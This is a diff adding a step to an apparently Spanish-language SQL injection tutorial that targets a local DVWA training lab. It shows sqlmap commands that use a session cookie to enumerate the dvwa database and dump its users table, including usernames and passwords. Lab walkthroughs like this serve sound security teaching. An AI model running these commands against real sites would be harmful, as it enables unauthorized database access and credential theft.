@@ -253,6 +253,15 @@ sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit#" --co
 sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=dqpmagfo58rgidbrdjp0vcu763" -D dvwa --tables --batch
 ```
 
+#### Explotamos la vulnerabilidad:
+
+Sqlmap explotará la vulnerabilidad SQL en el parámetro id, usará la sesión activa para acceder a la base de datos dvwa, y extraerá todas las filas y columnas de la tabla users, mostrando la información (como nombres de usuarios y contraseñas).
+
+```bash
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=dqpmagfo58rgidbrdjp0vcu763" -D dvwa -T users --dump
+```
+
+
 Puedes ver el video del ejemplo en el siguiente link:
 
 (estamos trabajando en aquello)
